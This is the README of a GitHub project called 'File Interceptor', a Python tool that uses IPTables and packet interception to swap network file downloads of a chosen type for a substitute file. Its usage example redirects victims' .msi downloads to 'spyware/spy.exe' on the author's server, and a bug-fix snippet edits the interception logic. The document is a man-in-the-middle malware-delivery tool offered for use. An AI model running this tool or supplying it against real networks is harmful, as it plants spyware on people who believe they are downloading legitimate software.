#  File Interceptor. 
A Python powered Script to replace Downloads taking place over Network. 

  - Replaces any File Downloads of Specified Filetype to desired File.
  - Automatically changes IPTables rules to facilitate Interception. 
  - Flushes IPTables upon Exit.

### Installation

To Clone the File Interceptor Repository..

```sh
# git clone https://github.com/gobinathan-l/File-Interceptor.git
# cd File-Interceptor
```

To install Dependencies..

```sh
# apt-get install build-essential python-dev libnetfilter-queue-dev
# pip install -r requirements.txt
```

To Execute the Script..
```sh
# python File_Interceptor.py -h
# python File_Interceptor.py -t msi -u http://192.168.1.102/spyware/spy.exe -m remote
```

Bug Fix:

In case the Target File and the Replacement File are of same type, the script kinda goes into a loop. To fix this bug, Goto line 46 and, replace the line 
```
if args.filetype in scapy_packet[scapy.Raw].load:
```
with 
```
if args.filetype in scapy_packet[scapy.Raw].load and "192.168.1.102" not in scapy_packet[scapy.Raw].load:
```
here the IP 192.168.1.102 is my Replacement File Server IP.

### About Author
I am Gobinathan, a CyberSecurity Enthusiast. To reach out to me..<br>
[GitHub](https://github.com/gobinathan-l/), [Linkedin](https://in.linkedin.com/in/gobinathan-l), [Twitter](https://twitter.com/gobinathan_l)


***Suggestions on Improvements and New Features are Welcome.***